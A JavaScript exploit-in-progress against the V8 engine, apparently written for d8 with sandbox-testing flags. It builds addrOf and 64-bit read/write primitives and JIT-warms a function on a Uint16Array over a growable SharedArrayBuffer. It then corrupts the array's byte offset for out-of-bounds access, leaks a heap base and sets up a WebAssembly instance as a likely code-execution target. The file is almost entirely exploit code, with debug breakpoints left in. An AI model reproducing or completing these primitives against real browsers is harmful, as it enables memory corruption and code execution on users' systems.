// r --expose-gc --allow-natives-syntax --sandbox-testing --trace-turbo --print-code ../../../tests/test3.js

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
return Sandbox.getAddressOf(obj);
}

function v8_read64(addr) {
return sandboxMemory.getBigUint64(Number(addr), true);
}

function v8_write64(addr, val) {
return sandboxMemory.setBigInt64(Number(addr), val, true);
}


const gsab = new SharedArrayBuffer(4,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab);

function foo(obj, index, val){
    obj[index] += val;
    return obj[index];
}

function test(iii, val){
    return foo(u16arr, iii, val);
}

for (let i = 0; i < 0x10000; i++) {
    test(1, 0);
}
let byte_offset_ofs = BigInt(addrOf(u16arr) + 0x17);
v8_write64(byte_offset_ofs+4n, 0x41414141n);

// console.log("byte_offset_ofs: " + byte_offset_ofs.toString(16));
// console.log("byte_offset: " + v8_read64(byte_offset_ofs).toString(16));

// %DebugPrint(u16arr);
// %SystemBreak();

// console.log("After writing, byte_offset: " + v8_read64(byte_offset_ofs).toString(16));

// ================= reading heap_base =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1);
let low_ofs_started_page = heap_addr & 0xffffffffn;
let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));

function arb_read(addr){
    // v8_write64(byte_offset_ofs, addr);
    
    return v8_read64(0x4242n);
}



var wasm_code2 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod2 = new WebAssembly.Module(wasm_code2);
var wasm_instance2 = new WebAssembly.Instance(wasm_mod2);
var f = wasm_instance2.exports.main;

// %DebugPrint(u16arr);
%DebugPrint(f);
%SystemBreak();

// access out-of-bounds
// test(34212359, 0);
